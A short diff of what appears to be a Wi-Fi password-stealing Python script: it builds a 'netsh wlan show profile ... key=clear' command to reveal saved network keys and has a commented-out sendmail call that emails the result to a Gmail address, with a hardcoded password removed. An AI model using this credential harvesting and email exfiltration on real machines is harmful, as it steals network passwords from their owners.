@@ -22,4 +22,4 @@ result = ""
 command = "netsh wlan show profile name=" + network_name_list[0] + " key=clear"
 print(command)
 
-#sendmail("sharma.rishix02@gmail.com", "Rishi2002", result)
+#sendmail("sharma.rishix02@gmail.com", "", result)
